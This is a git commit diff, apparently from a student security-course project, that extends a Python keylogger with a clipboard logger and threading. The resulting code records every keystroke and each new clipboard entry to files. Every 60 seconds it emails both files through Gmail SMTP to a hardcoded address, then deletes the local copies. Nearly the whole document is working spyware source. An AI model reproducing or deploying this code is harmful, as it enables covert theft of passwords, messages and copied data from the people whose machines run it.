f3d7498458a9318b7a2d1dce6fb227e50b1d2a79
Jonathan Lin <jonlin223@gmail.com>
2021-04-03 14:24:02 +1100

    cliplogger + threading

--- src/keylogger.py
+++ src/keylogger.py
@@ -1,4 +1,5 @@
 from pynput import keyboard
+from pyperclip import waitForNewPaste
 
 import smtplib
 from email import encoders
@@ -7,7 +8,10 @@ from email.mime.multipart import MIMEMultipart
 
 from datetime import datetime
 from os import remove
+from time import sleep
+import threading
 
+# Keyboard logger
 def on_press(key):
     with open("log.txt", "a") as log:
         try:
@@ -29,38 +33,68 @@ def keylogger():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-# Send email and wipe log
-def send_log():
+# Clipboard logger
+def cliplogger():
+    while True:
+        clip = waitForNewPaste()
+        with open("cliplog.txt", "a") as cliplog:
+            cliplog.write(clip + "\n")
+            print(clip)
 
-    # Send email
+# Send email and wipe log
+def send_logs():
+
+    # Get log time
     now = datetime.now()
     date_time = now.strftime("%d/%m/%Y, %H:%M:%S")
 
+    # Set log details
     msg = MIMEMultipart()
     msg['From'] = "scruffy.comp681.sa@gmail.com"
     msg['To'] = "scruffy.comp6841.sa@gmail.com"
     msg['Subject'] = f"log: {date_time}"
 
-    filename = "log.txt"
+    # Attach log files
+    filename1 = "log.txt"
+    filename2 = "cliplog.txt"
 
-    with open("log.txt", "rb") as fp:
-        part = MIMEBase("application", "octet-stream")
-        part.set_payload(fp.read())
-    encoders.encode_base64(part)
+    with open(filename1, "rb") as fp:
+        part1 = MIMEBase("application", "octet-stream")
+        part1.set_payload(fp.read())
+    encoders.encode_base64(part1)
+
+    with open(filename2, "rb") as fp:
+        part2 = MIMEBase("application", "octet-stream")
+        part2.set_payload(fp.read())
+    encoders.encode_base64(part2)
     
-    part.add_header("Content-Disposition", f"attachment; filename= {filename}")
-    msg.attach(part)
+    part1.add_header("Content-Disposition", f"attachment; filename= {filename1}")
+    part2.add_header("Content-Disposition", f"attachment; filename= {filename2}")
+    msg.attach(part1)
+    msg.attach(part2)
 
+    # Send email
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.ehlo()
     server.starttls()
     server.login("scruffy.comp6841.sa@gmail.com", "REDACTED")
     server.sendmail("scruffy.comp6841.sa@gmail.com", "scruffy.comp6841.sa@gmail.com", msg.as_string())
 
-    # Delete log
-    remove("log.txt")
+    # Delete logs
+    remove(filename1)
+    remove(filename2)
 
-send_log()
-keylogger()
+# Email loop
+def loopEmail():
+    while True:
+        sleep(60)
+        send_logs()
 
 # Plan: Run simultaneous threads for processes
+keyThread = threading.Thread(target=keylogger)
+clipThread = threading.Thread(target=cliplogger)
+emailThread = threading.Thread(target=loopEmail)
+
+keyThread.start()
+clipThread.start()
+emailThread.start()
